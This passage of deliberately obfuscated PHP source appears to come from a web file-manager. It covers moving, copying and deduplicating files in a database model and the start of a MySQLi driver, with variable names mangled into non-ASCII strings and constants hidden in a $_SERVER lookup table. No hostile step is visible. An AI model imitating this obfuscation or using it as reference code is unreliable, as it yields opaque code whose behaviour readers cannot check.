$“Üõ‡¨Ó[452] => str_replace($“Üõ‡¨Ó[53], $“Üõ‡¨Ó[12], Pinyin::get($Á¼ÊÑ³ø))); $Ç²©Üı[$“Üõ‡¨Ó[646]][] = array($“Üõ‡¨Ó[194] => $ìô¬ÎÄ©, $“Üõ‡¨Ó[97] => $“Üõ‡¨Ó[548], $“Üõ‡¨Ó[452] => Pinyin::get($Á¼ÊÑ³ø, $“Üõ‡¨Ó[672])); } $Ç²©Üı[$“Üõ‡¨Ó[646]][] = array($“Üõ‡¨Ó[194] => $ìô¬ÎÄ©, $“Üõ‡¨Ó[97] => $“Üõ‡¨Ó[528], $“Üõ‡¨Ó[452] => KodSort::makeStr($Á¼ÊÑ³ø)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($©Ú©Ì¡„) { $Ûš¦Ğ÷ =& $_SERVER[åÄ¼Ùßš]; $‰”òÍ¶ù = $this->sourceInfo($©Ú©Ì¡„); $¤íâãœ = $Ûš¦Ğ÷[673]; $§Ç±‚ÙÚ = array($Ûš¦Ğ÷[597] => array($Ûš¦Ğ÷[628], $‰”òÍ¶ù[$Ûš¦Ğ÷[597]] . $©Ú©Ì¡„ . $Ûš¦Ğ÷[629]), $Ûš¦Ğ÷[517] => $this->targetIsDelete); $‘°àøÙ = $this->field($¤íâãœ)->where($§Ç±‚ÙÚ)->select(); if (!$‘°àøÙ) { return; } $‘°àøÙ = array_to_keyvalue($‘°àøÙ, $Ûš¦Ğ÷[194]); foreach ($‘°àøÙ as $Ğğ˜ Ä”) { $­ºÜó¦– = $Ğğ˜ Ä”[$Ûš¦Ğ÷[193]]; $©Ú©Ì¡„ = $Ğğ˜ Ä”[$Ûš¦Ğ÷[194]]; if (!isset($this->_childrenListCache[$©Ú©Ì¡„]) && $Ğğ˜ Ä”[$Ûš¦Ğ÷[497]] == $Ûš¦Ğ÷[91]) { $this->_childrenListCache[$©Ú©Ì¡„] = array(); } if (!isset($this->_childrenListCache[$­ºÜó¦–])) { $this->_childrenListCache[$­ºÜó¦–] = array(); } $this->_childrenListCache[$­ºÜó¦–][$©Ú©Ì¡„] = $Ğğ˜ Ä”; $this->_childrenItemCache[$©Ú©Ì¡„] = $Ğğ˜ Ä”; } } private function _childrenListAll($Î‹¡¿³ç, &$Ù¤ƒÚÙØ) { $…‰àª”ô =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->_childrenListCache[$Î‹¡¿³ç])) { return; } $¬†¾…ƒ‰ = $this->_childrenListCache[$Î‹¡¿³ç]; foreach ($¬†¾…ƒ‰ as $˜®“Òªß => $Ø—«øå) { $Ù¤ƒÚÙØ[$˜®“Òªß] = $Ø—«øå; if ($Ø—«øå[$…‰àª”ô[497]] == $…‰àª”ô[91]) { $this->_childrenListAll($˜®“Òªß, $Ù¤ƒÚÙØ); } } } private function sourceInfoCache($ÇØî¡÷) { if (isset($this->_childrenItemCache[$ÇØî¡÷])) { return $this->_childrenItemCache[$ÇØî¡÷]; } return $this->sourceInfo($ÇØî¡÷); } private function _childrenList($÷Ñ¶ù˜ò) { if (isset($this->_childrenListCache[$÷Ñ¶ù˜ò])) { return $this->_childrenListCache[$÷Ñ¶ù˜ò]; } return $this->_childrenListSelect($÷Ñ¶ù˜ò); } private function _childrenListSelect($Ã¦Œôô×) { $Ú©‘ãˆ =& $_SERVER[åÄ¼Ùßš]; $şµá£¤¤ = array($Ú©‘ãˆ[193] => $Ã¦Œôô×, $Ú©‘ãˆ[517] => $this->targetIsDelete); $¼Ş«¸ÁÀ = $this->where($şµá£¤¤)->select(); $¼Ş«¸ÁÀ = $¼Ş«¸ÁÀ ? $¼Ş«¸ÁÀ : array(); $Ã ÉÖ’ä = array_to_keyvalue($¼Ş«¸ÁÀ, $Ú©‘ãˆ[194]); $this->_childrenListCache[$Ã¦Œôô×] = $Ã ÉÖ’ä; foreach ($Ã ÉÖ’ä as $Ã¦Œôô× => $”ó°¢‰ç) { $this->_childrenItemCache[$Ã¦Œôô×] = $”ó°¢‰ç; } return $Ã ÉÖ’ä; } private function fileNameExistAuto($†Ğï«‘Û, $ÚÏá¤ÚŠ) { $œ©Íøß =& $_SERVER[åÄ¼Ùßš]; if ($ÚÏá¤ÚŠ[$œ©Íøß[517]] == $œ©Íøß[91]) { return $this->fileNameExist($†Ğï«‘Û, $ÚÏá¤ÚŠ[$œ©Íøß[32]]); } return $this->fileNameExistCache($†Ğï«‘Û, $ÚÏá¤ÚŠ[$œ©Íøß[32]]); } private function fileNameExistCache($õõ¹õúÉ, $»Ã–ï™¾) { $Ìãıƒã´ =& $_SERVER[åÄ¼Ùßš]; $»Ã–ï™¾ = strtolower($»Ã–ï™¾); $Çà×æ°å = $this->_childrenList($õõ¹õúÉ); foreach ($Çà×æ°å as $Ü³Ç³î) { if ($»Ã–ï™¾ == strtolower($Ü³Ç³î[$Ìãıƒã´[32]])) { return $Ü³Ç³î[$Ìãıƒã´[194]]; } } return !1; } private function fileNameAutoCache($§Şó‹¹·, $Åû•À¿—, $â³Ñ§¸, $ °õÌÁİ) { $İ„š¬Šƒ =& $_SERVER[åÄ¼Ùßš]; $¹Êø€ĞÀ = $this->_childrenList($§Şó‹¹·); $ººìÆ·Õ = array_to_keyvalue($¹Êø€ĞÀ, $İ„š¬Šƒ[12], $İ„š¬Šƒ[32]); return $this->fileNameAutoGet($ººìÆ·Õ, $Åû•À¿—, $â³Ñ§¸, $ °õÌÁİ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($«‡ñĞœ, $ëµØê¨, $‡’£óáÂ = REPEAT_REPLACE, $§šİ¹ÖŸ = '') { $œŒûóˆº =& $_SERVER[åÄ¼Ùßš]; $¸Íı‡šÉ = $this->sourceInfo($«‡ñĞœ); $Ã­Ã”ï“ = $this->sourceInfo($ëµØê¨); if ($¸Íı‡šÉ[$œŒûóˆº[193]] == $Ã­Ã”ï“[$œŒûóˆº[194]]) { if ($¸Íı‡šÉ[$œŒûóˆº[517]] == $œŒûóˆº[91]) { Model($œŒûóˆº[515])->restore(array($«‡ñĞœ)); } if (!$§šİ¹ÖŸ || $§šİ¹ÖŸ == $¸Íı‡šÉ[$œŒûóˆº[32]]) { return $«‡ñĞœ; } } $ñåÔáã‘ = $this->pathInfoMore($«‡ñĞœ); if ($this->isParentOf($«‡ñĞœ, $ëµØê¨)) { return !1; } if (!$¸Íı‡šÉ || !$Ã­Ã”ï“ || $Ã­Ã”ï“[$œŒûóˆº[497]] != $œŒûóˆº[91]) { return !1; } Hook::trigger($œŒûóˆº[674], $ñåÔáã‘); $this->targetIsDelete = intval($¸Íı‡šÉ[$œŒûóˆº[517]]); if ($¸Íı‡šÉ[$œŒûóˆº[193]] == $ëµØê¨ && $§šİ¹ÖŸ != $¸Íı‡šÉ[$œŒûóˆº[32]]) { $Ÿ¶öÃÍ¶ = $this->fileNameExist($ëµØê¨, $§šİ¹ÖŸ); if ($Ÿ¶öÃÍ¶ && $¸Íı‡šÉ[$œŒûóˆº[497]] == $œŒûóˆº[231]) { $¸ı„Ë£ = $this->sourceInfo($Ÿ¶öÃÍ¶); $¼ŞÇ£â = $this->fileHistory($¸ı„Ë£, $¸Íı‡šÉ[$œŒûóˆº[554]], $¸Íı‡šÉ[$œŒûóˆº[79]]); if (!$¼ŞÇ£â) { Model($œŒûóˆº[557])->remove($¸Íı‡šÉ[$œŒûóˆº[554]]); } $this->removeNow($«‡ñĞœ, !1); $this->folderSizeReset($ëµØê¨); Hook::trigger($œŒûóˆº[675], $ñåÔáã‘); return $Ÿ¶öÃÍ¶; } } $ÑóØ›ìÌ = $§šİ¹ÖŸ ? $§šİ¹ÖŸ : $¸Íı‡šÉ[$œŒûóˆº[32]]; $this->lockMoveStart($«‡ñĞœ); $this->lockWriteStart($ëµØê¨, $ÑóØ›ìÌ); $°àƒ¬óµ = array($œŒûóˆº[645] => array(), $œŒûóˆº[676] => !1); $this->clearShare($«‡ñĞœ, $ëµØê¨); $Œ—Ş½òÆ = $this->fileNameExistAuto($ëµØê¨, $¸Íı‡šÉ); $Î››«çÅ = $this->_move($«‡ñĞœ, $ëµØê¨, $‡’£óáÂ, $°àƒ¬óµ, $§šİ¹ÖŸ); $this->sourceCacheClear(); if ($¸Íı‡šÉ[$œŒûóˆº[497]] == $œŒûóˆº[91] && $Œ—Ş½òÆ) { $this->folderSizeResetChildren($Î››«çÅ); } Model($œŒûóˆº[233])->linkAdd($°àƒ¬óµ[$œŒûóˆº[645]]); if ($Î››«çÅ && $Œ—Ş½òÆ && $°àƒ¬óµ[$œŒûóˆº[676]]) { $”‰‹ü = $¸Íı‡šÉ[$œŒûóˆº[497]] == $œŒûóˆº[91] ? $this->_childrenListSelect($«‡ñĞœ) : !1; $‘Ş¢îò‘ = $”‰‹ü && count($”‰‹ü) > 0 ? !0 : !1; $this->removeNow($«‡ñĞœ, $‘Ş¢îò‘); } $this->lockMoveEnd($«‡ñĞœ); $this->lockWriteEnd($ëµØê¨, $ÑóØ›ìÌ); $this->folderSizeReset($¸Íı‡šÉ[$œŒûóˆº[193]]); $this->folderSizeReset($ëµØê¨); $á™Ú•²‚ = array($¸Íı‡šÉ[$œŒûóˆº[193]], $ëµØê¨); if ($¸Íı‡šÉ[$œŒûóˆº[497]] == $œŒûóˆº[91]) { $á™Ú•²‚[] = $«‡ñĞœ; } $this->updateModifyTime($á™Ú•²‚); Model($œŒûóˆº[649])->eventMove($«‡ñĞœ, $¸Íı‡šÉ[$œŒûóˆº[193]], $ëµØê¨); Hook::trigger($œŒûóˆº[675], $ñåÔáã‘); return $Î››«çÅ; } private function _move($°…ÈÃŸ£, $ü†¶åæ, $ÊÊ—ÑÑµ, &$¥Û˜Ï¸ä, $Œ¼ùÎÜË = '') { $àæ×ßÂÔ =& $_SERVER[åÄ¼Ùßš]; $Áı¥á» = $this->sourceInfo($°…ÈÃŸ£); $ıà²‡åñ = $Áı¥á»[$àæ×ßÂÔ[497]] == $àæ×ßÂÔ[91]; $»À‹á¶¼ = $Œ¼ùÎÜË ? $Œ¼ùÎÜË : $Áı¥á»[$àæ×ßÂÔ[32]]; $ƒĞÀÒ£ = $this->fileNameExistAuto($ü†¶åæ, $Áı¥á»); $this->lockMoveStart($°…ÈÃŸ£); $this->lockWriteStart($ü†¶åæ, $»À‹á¶¼); if (!$ƒĞÀÒ£) { return $this->_moveForce($°…ÈÃŸ£, $ü†¶åæ, $»À‹á¶¼); } $õŒ¨äÑ = $ƒĞÀÒ£; $’µüïØ = !1; if ($ıà²‡åñ) { if ($ÊÊ—ÑÑµ == REPEAT_RENAME_FOLDER) { $»À‹á¶¼ = $this->fileNameAuto($ü†¶åæ, $»À‹á¶¼, $ÊÊ—ÑÑµ, $ıà²‡åñ); $õŒ¨äÑ = $this->_moveForce($°…ÈÃŸ£, $ü†¶åæ, $»À‹á¶¼); } else { $Ğı®ó° = $this->_childrenListSelect($°…ÈÃŸ£); foreach ($Ğı®ó° as $‘óÑÖ£—) { $ƒ¥Ü€Ó¦ = REPEAT_REPLACE; $this->_move($‘óÑÖ£—[$àæ×ßÂÔ[194]], $ƒĞÀÒ£, $ƒ¥Ü€Ó¦, $¥Û˜Ï¸ä); } $’µüïØ = !0; } } else { if ($ÊÊ—ÑÑµ == REPEAT_RENAME || $ÊÊ—ÑÑµ == REPEAT_RENAME_FOLDER) { $»À‹á¶¼ = $this->fileNameAuto($ü†¶åæ, $»À‹á¶¼, $ÊÊ—ÑÑµ, $ıà²‡åñ); $õŒ¨äÑ = $this->_moveForce($°…ÈÃŸ£, $ü†¶åæ, $»À‹á¶¼); } else { $•ŒœÛ¦ = $this->sourceInfoCache($ƒĞÀÒ£); $Ší˜Â‚¬ = $this->fileHistory($•ŒœÛ¦, $Áı¥á»[$àæ×ßÂÔ[554]], $Áı¥á»[$àæ×ßÂÔ[79]]); if ($Ší˜Â‚¬) { $¥Û˜Ï¸ä[$àæ×ßÂÔ[645]][] = $Áı¥á»[$àæ×ßÂÔ[554]]; } $’µüïØ = !0; } } if ($’µüïØ) { $¥Û˜Ï¸ä[$àæ×ßÂÔ[676]] = !0; } return $õŒ¨äÑ; } private function _moveForce($Úİ­Ÿ²ˆ, $İÜåêë’, $ëÄùªéû) { $äÅ›Ñ•ó =& $_SERVER[åÄ¼Ùßš]; $§¯½² = $this->sourceInfo($Úİ­Ÿ²ˆ); $äÊ×•šÅ = $this->sourceInfo($İÜåêë’); $‹„“¿å = $§¯½²[$äÅ›Ñ•ó[497]] == $äÅ›Ñ•ó[91]; $‚¤§ƒê¦ = array($äÅ›Ñ•ó[489] => $äÊ×•šÅ[$äÅ›Ñ•ó[194]], $äÅ›Ñ•ó[668] => $äÊ×•šÅ[$äÅ›Ñ•ó[597]] . $äÊ×•šÅ[$äÅ›Ñ•ó[194]] . $äÅ›Ñ•ó[50], $äÅ›Ñ•ó[664] => $äÊ×•šÅ[$äÅ›Ñ•ó[191]], $äÅ›Ñ•ó[665] => $äÊ×•šÅ[$äÅ›Ñ•ó[582]], $äÅ›Ñ•ó[667] => USER_ID, $äÅ›Ñ•ó[506] => $ëÄùªéû); $ÎúöŠø = $§¯½²[$äÅ›Ñ•ó[191]] == SourceModel::TYPE_GROUP && $äÊ×•šÅ[$äÅ›Ñ•ó[191]] == SourceModel::TYPE_GROUP && $§¯½²[$äÅ›Ñ•ó[582]] == $äÊ×•šÅ[$äÅ›Ñ•ó[582]]; if (!$ÎúöŠø && $this->moveClearAuth) { Model($äÅ›Ñ•ó[580])->authClear($Úİ­Ÿ²ˆ); } $¦ì³Ñ•Ò = $§¯½²[$äÅ›Ñ•ó[517]] == $äÅ›Ñ•ó[91] && $äÊ×•šÅ[$äÅ›Ñ•ó[517]] != $äÅ›Ñ•ó[91]; if ($¦ì³Ñ•Ò) { $‚¤§ƒê¦[$äÅ›Ñ•ó[516]] = 0; } if ($‹„“¿å) { $¸ƒç«‡ˆ = array($äÅ›Ñ•ó[668] => array($äÅ›Ñ•ó[628], $§¯½²[$äÅ›Ñ•ó[597]] . $§¯½²[$äÅ›Ñ•ó[194]] . $äÅ›Ñ•ó[629])); $ó„ƒø»¶ = $§¯½²[$äÅ›Ñ•ó[597]] . $§¯½²[$äÅ›Ñ•ó[194]] . $äÅ›Ñ•ó[50]; $ĞŒ°é°Ä = $äÊ×•šÅ[$äÅ›Ñ•ó[597]] . $äÊ×•šÅ[$äÅ›Ñ•ó[194]] . $äÅ›Ñ•ó[50] . $§¯½²[$äÅ›Ñ•ó[194]] . $äÅ›Ñ•ó[50]; $îÙØ‡øÄ = array($äÅ›Ñ•ó[668] => array($äÅ›Ñ•ó[677], "\162\x65\160\154\x61\143\145\50\x70\141\162\145\156\x74\114\145\x76\x65\x6c\54\x27{$ó„ƒø»¶}\x27\x2c\47{$ĞŒ°é°Ä}\47\51"), $äÅ›Ñ•ó[664] => $äÊ×•šÅ[$äÅ›Ñ•ó[191]], $äÅ›Ñ•ó[665] => $äÊ×•šÅ[$äÅ›Ñ•ó[582]]); if ($¦ì³Ñ•Ò) { $îÙØ‡øÄ[$äÅ›Ñ•ó[516]] = 0; } $this->where($¸ƒç«‡ˆ)->data($îÙØ‡øÄ)->save(); } $this->where(array($äÅ›Ñ•ó[503] => $Úİ­Ÿ²ˆ))->data($‚¤§ƒê¦)->save(); return $Úİ­Ÿ²ˆ; } private function clearShare($Öø“¹ğŒ, $¬­ç‰ßß) { $¬¸êÀİ =& $_SERVER[åÄ¼Ùßš]; $¾‹ÚÚÇÂ = $this->sourceInfo($Öø“¹ğŒ); $èÑŸŞ¶ò = $this->sourceInfo($¬­ç‰ßß); if ($¾‹ÚÚÇÂ[$¬¸êÀİ[582]] == $èÑŸŞ¶ò[$¬¸êÀİ[582]] && $¾‹ÚÚÇÂ[$¬¸êÀİ[191]] == $¬¸êÀİ[678]) { return; } $ÊçÓšı¼ = array($¬¸êÀİ[597] => array($¬¸êÀİ[628], $¾‹ÚÚÇÂ[$¬¸êÀİ[597]] . $Öø“¹ğŒ . $¬¸êÀİ[629])); $µßŸ¥ª = $this->field($¬¸êÀİ[503])->where($ÊçÓšı¼)->getField($¬¸êÀİ[194], !0); if (!$µßŸ¥ª) { return; } $ÊçÓšı¼ = array($¬¸êÀİ[194] => array($¬¸êÀİ[7], $µßŸ¥ª), $¬¸êÀİ[679] => 1); $ø¦À“»ë = Model($¬¸êÀİ[680])->field($¬¸êÀİ[681])->where($ÊçÓšı¼)->select(); if (!$ø¦À“»ë) { return; } $ø¦À“»ë = array_to_keyvalue($ø¦À“»ë, $¬¸êÀİ[12], $¬¸êÀİ[681]); $ÊçÓšı¼ = array($¬¸êÀİ[681] => array($¬¸êÀİ[7], $ø¦À“»ë)); Model($¬¸êÀİ[680])->where($ÊçÓšı¼)->save(array($¬¸êÀİ[679] => 0)); Model($¬¸êÀİ[682])->where($ÊçÓšı¼)->delete(); } public function copyFolderFromIO($ö•‰‹Ø¸, $×³Şç«°, $–¶ËıòĞ, $¶­ë×ŠÈ, $ÓÄî²úÅ, $Ÿê±ú¥™ = false) { $¥ŒÜŞ‹· =& $_SERVER[åÄ¼Ùßš]; $¢íÀ¤ÆÖ = array($¥ŒÜŞ‹·[646] => array(), $¥ŒÜŞ‹·[647] => array(), $¥ŒÜŞ‹·[645] => array(), $¥ŒÜŞ‹·[683] => array()); $áºÕ—şõ = $Ÿê±ú¥™ ? $Ÿê±ú¥™ : $ö•‰‹Ø¸->pathThis($×³Şç«°); $’å™‘—Á = $this->fileNameExist($–¶ËıòĞ, $áºÕ—şõ); $‡Ğ¦Ø³ş = $this->mkdir($–¶ËıòĞ, $áºÕ—şõ, $¶­ë×ŠÈ); if (!$’å™‘—Á || $¶­ë×ŠÈ == REPEAT_RENAME_FOLDER) { $¶­ë×ŠÈ = !1; } if ($’å™‘—Á) { $this->_childrenAllMake($’å™‘—Á); } Hook::trigger($¥ŒÜŞ‹·[684]); $‹²¹Ê¤  = KodIO::ioFileDriverGet($¥ŒÜŞ‹·[495] . $–¶ËıòĞ . $¥ŒÜŞ‹·[404]); $this->_copyChildTo($ö•‰‹Ø¸, $×³Şç«°, $‡Ğ¦Ø³ş, $¶­ë×ŠÈ, $¢íÀ¤ÆÖ, $ÓÄî²úÅ, $‹²¹Ê¤ ); Hook::trigger($¥ŒÜŞ‹·[685]); if ($‡Ğ¦Ø³ş) { $this->folderSizeResetChildren($‡Ğ¦Ø³ş); } $this->_childrenListClear(); Model($¥ŒÜŞ‹·[648])->addAll($¢íÀ¤ÆÖ[$¥ŒÜŞ‹·[646]], array(), !0); Model($¥ŒÜŞ‹·[649])->eventCopy($‡Ğ¦Ø³ş); $this->saveAll($¢íÀ¤ÆÖ[$¥ŒÜŞ‹·[647]]); Model($¥ŒÜŞ‹·[557])->linkAdd($¢íÀ¤ÆÖ[$¥ŒÜŞ‹·[645]]); Model($¥ŒÜŞ‹·[557])->remove($¢íÀ¤ÆÖ[$¥ŒÜŞ‹·[683]]); $this->folderSizeReset($–¶ËıòĞ); $this->updateModifyTime($–¶ËıòĞ); return $‡Ğ¦Ø³ş; } private function _copyChildTo($ÙİĞô”, $—é¤Üš, $ïÌçÇæğ, $İ¯ÛÒÒÂ, &$…Õ¤ò½«, $€¿ÆªŸÛ, $ïê°šøù) { $™Ïı¿ =& $_SERVER[åÄ¼Ùßš]; $êòŠÆüì = $this->sourceInfoCache($ïÌçÇæğ); $”‰Û£‚ş = $ÙİĞô”->listPath($—é¤Üš); $”‰Û£‚ş = $”‰Û£‚ş ? $”‰Û£‚ş : array($™Ïı¿[86] => array(), $™Ïı¿[85] => array()); $øı¨ê¡ = array_merge($”‰Û£‚ş[$™Ïı¿[86]], $”‰Û£‚ş[$™Ïı¿[85]]); $Çä†‘Ó = $this->_addFiles($ÙİĞô”, $ïê°šøù, $”‰Û£‚ş[$™Ïı¿[86]], $€¿ÆªŸÛ); $…Â“ìÎ² = array(); foreach ($øı¨ê¡ as &$É“²à¡) { if (isset($Çä†‘Ó[$É“²à¡[$™Ïı¿[32]]])) { $É“²à¡ = $Çä†‘Ó[$É“²à¡[$™Ïı¿[32]]]; } $É“²à¡[$™Ïı¿[497]] = $É“²à¡[$™Ïı¿[33]] == $™Ïı¿[78]; $É“²à¡[$™Ïı¿[498]] = substr(_get($É“²à¡, $™Ïı¿[169], $™Ïı¿[12]), 0, 10); $É“²à¡[$™Ïı¿[79]] = _get($É“²à¡, $™Ïı¿[79], 0); $É“²à¡[$™Ïı¿[554]] = _get($É“²à¡, $™Ïı¿[554], 0); if (!isset($É“²à¡[$™Ïı¿[686]]) && $É“²à¡[$™Ïı¿[554]]) { $…Õ¤ò½«[$™Ïı¿[683]][] = $É“²à¡[$™Ïı¿[554]]; } if ($İ¯ÛÒÒÂ) { $šåş–Àã = $this->fileNameExistCache($ïÌçÇæğ, $É“²à¡[$™Ïı¿[32]]); if ($šåş–Àã) { if ($É“²à¡[$™Ïı¿[497]] || $İ¯ÛÒÒÂ == REPEAT_SKIP) { continue; } if ($İ¯ÛÒÒÂ == REPEAT_REPLACE) { $”ÃŞòò» = $this->sourceInfoCache($šåş–Àã); $è¼Ëáë = $this->fileHistory($”ÃŞòò», $É“²à¡[$™Ïı¿[554]], $É“²à¡[$™Ïı¿[79]]); if ($è¼Ëáë) { $…Õ¤ò½«[$™Ïı¿[645]][] = $É“²à¡[$™Ïı¿[554]]; } continue; } else { if ($İ¯ÛÒÒÂ == REPEAT_RENAME) { $É“²à¡[$™Ïı¿[32]] = $this->fileNameAutoCache($ïÌçÇæğ, $É“²à¡[$™Ïı¿[32]], $İ¯ÛÒÒÂ, !1); } } } } if (!$É“²à¡[$™Ïı¿[497]] && $É“²à¡[$™Ïı¿[554]] == 0) { continue; } if (!$É“²à¡[$™Ïı¿[497]] && $É“²à¡[$™Ïı¿[554]]) { $…Õ¤ò½«[$™Ïı¿[645]][] = $É“²à¡[$™Ïı¿[554]]; } $…Â“ìÎ²[] = $this->_makeItemData($É“²à¡, $êòŠÆüì, $É“²à¡[$™Ïı¿[32]]); } unset($É“²à¡); if (!empty($…Â“ìÎ²)) { $this->addAll($…Â“ìÎ²); $this->_childrenListSelect($ïÌçÇæğ); } $¾™ıà°µ = $this->_childrenList($ïÌçÇæğ); $¾™ıà°µ = array_to_keyvalue($¾™ıà°µ, $™Ïı¿[32]); foreach ($øı¨ê¡ as $É“²à¡) { $”ÃŞòò» = $¾™ıà°µ[$É“²à¡[$™Ïı¿[32]]]; $‹¶•´ÕŠ = $”ÃŞòò»[$™Ïı¿[194]]; $this->_copyApplyMeta($”ÃŞòò», $…Õ¤ò½«); if ($É“²à¡[$™Ïı¿[33]] == $™Ïı¿[78]) { $É“²à¡[$™Ïı¿[87]] = $ÙİĞô”->getPathInner($É“²à¡[$™Ïı¿[87]]); $this->_copyChildTo($ÙİĞô”, $É“²à¡[$™Ïı¿[87]], $‹¶•´ÕŠ, $İ¯ÛÒÒÂ, $…Õ¤ò½«, $€¿ÆªŸÛ, $ïê°šøù); } } } private function _addFiles($Ÿìœ­º…, $èé•çİø, $µÌƒ–¼ª, $í´½ïµî) { $×¢óˆ’ =& $_SERVER[åÄ¼Ùßš]; if (!$µÌƒ–¼ª || count($µÌƒ–¼ª) == 0) { return array(); } $ı®†—ñÔ = array(); foreach ($µÌƒ–¼ª as &$äƒ¦İÀŠ) { Hook::trigger($×¢óˆ’[687], $äƒ¦İÀŠ); $äƒ¦İÀŠ[$×¢óˆ’[87]] = $Ÿìœ­º…->getPathInner($äƒ¦İÀŠ[$×¢óˆ’[87]]); $´Û¬ñÆ = $Ÿìœ­º…->hashSimple($äƒ¦İÀŠ[$×¢óˆ’[87]]); $‡ıÀ¶óÜ = $Ÿìœ­º…->hashMd5($äƒ¦İÀŠ[$×¢óˆ’[87]]); if (strlen($‡ıÀ¶óÜ) > 10 && !isset($ı®†—ñÔ[$‡ıÀ¶óÜ])) { $ı®†—ñÔ[$‡ıÀ¶óÜ] = array(); } $äƒ¦İÀŠ[$×¢óˆ’[688]] = $´Û¬ñÆ; $äƒ¦İÀŠ[$×¢óˆ’[560]] = $‡ıÀ¶óÜ; $ı®†—ñÔ[$‡ıÀ¶óÜ][] =& $äƒ¦İÀŠ; if (count($ı®†—ñÔ[$‡ıÀ¶óÜ]) > 1) { $äƒ¦İÀŠ[$×¢óˆ’[686]] = !0; } Hook::trigger($×¢óˆ’[689], $äƒ¦İÀŠ); } unset($äƒ¦İÀŠ); $øíÈñ½Å = array($×¢óˆ’[560] => array($×¢óˆ’[7], array_keys($ı®†—ñÔ))); $ƒˆÀ“ğç = Model($×¢óˆ’[690]); $åˆàëëº = $ƒˆÀ“ğç->where($øíÈñ½Å)->select(); $åˆàëëº = $åˆàëëº ? $åˆàëëº : array(); foreach ($åˆàëëº as $¡°Øö¸Œ) { if (!isset($ı®†—ñÔ[$¡°Øö¸Œ[$×¢óˆ’[560]]])) { continue; } $ıæóŠ©­ = $ı®†—ñÔ[$¡°Øö¸Œ[$×¢óˆ’[560]]]; foreach ($ıæóŠ©­ as &$äƒ¦İÀŠ) { $äƒ¦İÀŠ[$×¢óˆ’[554]] = $¡°Øö¸Œ[$×¢óˆ’[554]]; $äƒ¦İÀŠ[$×¢óˆ’[686]] = !0; } unset($äƒ¦İÀŠ); } $÷Éøƒ’ö = array(); foreach ($µÌƒ–¼ª as $²é²®æë) { Hook::trigger($×¢óˆ’[691], $²é²®æë); if (isset($²é²®æë[$×¢óˆ’[686]]) && $²é²®æë[$×¢óˆ’[686]]) { Hook::trigger($×¢óˆ’[692], $²é²®æë); continue; } $´¡ßİ„ˆ = $Ÿìœ­º…->getPathInner($²é²®æë[$×¢óˆ’[87]]); $¬¥“ïÀû = $ƒˆÀ“ğç->addFileMake($´¡ßİ„ˆ, $èé•çİø, $²é²®æë[$×¢óˆ’[79]], $²é²®æë[$×¢óˆ’[688]], $²é²®æë[$×¢óˆ’[560]], $²é²®æë[$×¢óˆ’[32]], $í´½ïµî); Hook::trigger($×¢óˆ’[692], $²é²®æë); if (!is_array($¬¥“ïÀû)) { continue; } $÷Éøƒ’ö[] = $¬¥“ïÀû; } $ƒˆÀ“ğç->addAll($÷Éøƒ’ö); $øíÈñ½Å = array($×¢óˆ’[560] => array($×¢óˆ’[7], array_keys($ı®†—ñÔ))); $åˆàëëº = $ƒˆÀ“ğç->where($øíÈñ½Å)->select(); $åˆàëëº = $åˆàëëº ? $åˆàëëº : array(); foreach ($åˆàëëº as $¡°Øö¸Œ) { if (!isset($ı®†—ñÔ[$¡°Øö¸Œ[$×¢óˆ’[560]]])) { continue; } $“„Ë×¤¬ =& $ı®†—ñÔ[$¡°Øö¸Œ[$×¢óˆ’[560]]]; foreach ($“„Ë×¤¬ as &$äƒ¦İÀŠ) { $äƒ¦İÀŠ[$×¢óˆ’[554]] = $¡°Øö¸Œ[$×¢óˆ’[554]]; } unset($äƒ¦İÀŠ); } $”°„‚Çá = array(); foreach ($µÌƒ–¼ª as $À·Ã¿ëÒ) { $”°„‚Çá[$À·Ã¿ëÒ[$×¢óˆ’[32]]] = $À·Ã¿ëÒ; } return $”°„‚Çá; } } define($_SERVER[åÄ¼Ùßš][693], $_SERVER[åÄ¼Ùßš][694]); $bohyrgwxnt = $_SERVER[åÄ¼Ùßš][695]; goto fÒ¿‰·Ö˜Ğ; Cãªê®ÛáÑ: class DbMysqli extends Db { public function __construct($òÍÌ€¥Ã = '') { $ÇÉŸÀû¶ =& $_SERVER[åÄ¼Ùßš]; if (!extension_loaded($ÇÉŸÀû¶[1020])) { think_exception(think_lang($ÇÉŸÀû¶[14]) . $ÇÉŸÀû¶[1021]); } if (!empty($òÍÌ€¥Ã)) { $this->config = $òÍÌ€¥Ã; if (empty($this->config[$ÇÉŸÀû¶[17]])) { $this->config[$ÇÉŸÀû¶[17]] = $ÇÉŸÀû¶[12]; } } } public function connect($ï±Ñ®‡ô = '', $Çªãº¦– = 0) { $Òµµˆ½ =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->linkID[$Çªãº¦–])) { if (empty($ï±Ñ®‡ô)) { $ï±Ñ®‡ô = $this->config; } $this->linkID[$Çªãº¦–] = new mysqli($ï±Ñ®‡ô[$Òµµˆ½[991]], $ï±Ñ®‡ô[$Òµµˆ½[993]], $ï±Ñ®‡ô[$Òµµˆ½[994]], $ï±Ñ®‡ô[$Òµµˆ½[21]], $ï±Ñ®‡ô[$Òµµˆ½[992]] ? intval($ï±Ñ®‡ô[$Òµµˆ½[992]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ëáûİ†é = $this->linkID[$Çªãº¦–]->server_version; $this->linkID[$Çªãº¦–]->query($Òµµˆ½[995] . think_config($Òµµˆ½[996]) . $Òµµˆ½[58]); if ($ëáûİ†é > $Òµµˆ½[997]) { $this->linkID[$Çªãº¦–]->query($Òµµˆ½[998]); } $this->connected = !0; if (1 != think_config($Òµµˆ½[22])) { unset($this->config); } } return $this->linkID[$Çªãº¦–]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($˜Å„ÂĞ) { $Ìñ€ş§ =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜Å„ÂĞ; if ($this->queryID) { $this->free(); } think_action_status($Ìñ€ş§[23], 1); think_status($Ìñ€ş§[24]); $this->queryID = $this->_linkID->query($˜Å„ÂĞ); if ($this->_linkID->more_results()) { while (($Ş€Â‹†Î = $this->_linkID->next_result()) != NULL) { $Ş€Â‹†Î->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return 